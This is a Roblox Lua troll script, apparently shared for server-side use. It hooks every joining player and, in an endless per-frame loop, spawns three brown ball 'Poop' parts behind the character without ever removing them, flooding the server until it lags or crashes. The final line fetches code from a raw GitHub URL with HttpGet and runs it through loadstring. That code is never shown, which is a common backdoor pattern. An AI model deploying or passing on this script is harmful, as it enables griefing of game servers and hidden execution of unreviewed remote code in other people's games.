-- you can use ts, no credits needed.
-- also ts is now better gng (no delay)

function ss_poopscript()
	local script = Instance.new('Script', game.ServerScriptService) -- DON'T DELETE TS.

	game.Players.PlayerAdded:Connect(function(plr)
		plr.CharacterAdded:Connect(function(char)
			local rootPart = char.HumanoidRootPart
			while task.wait() do
				local part = Instance.new("Part", workspace)
				part.Name = "Poop"
				part.Anchored = false
				part.Position = rootPart.CFrame * Vector3.new(0, -2, 3)
				part.Shape = Enum.PartType.Ball
				part.Size = Vector3.new(2,2,2)
				part.BrickColor = BrickColor.new("Brown")
				local part1 = Instance.new("Part", workspace)
				part1.Name = "Poop"
				part1.Anchored = false
				part1.Position = rootPart.CFrame * Vector3.new(0, -2, 3)
				part1.Shape = Enum.PartType.Ball
				part1.Size = Vector3.new(2,2,2)
				part1.BrickColor = BrickColor.new("Brown")
				local part2 = Instance.new("Part", workspace)
				part2.Name = "Poop"
				part2.Anchored = false
				part2.Position = rootPart.CFrame * Vector3.new(0, -2, 3)
				part2.Shape = Enum.PartType.Ball
				part2.Size = Vector3.new(2,2,2)
				part2.BrickColor = BrickColor.new("Brown")
			end
		end)
	end)
end
ss_poopscript()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CrystalzzDev/notif/main/loadstring"))()
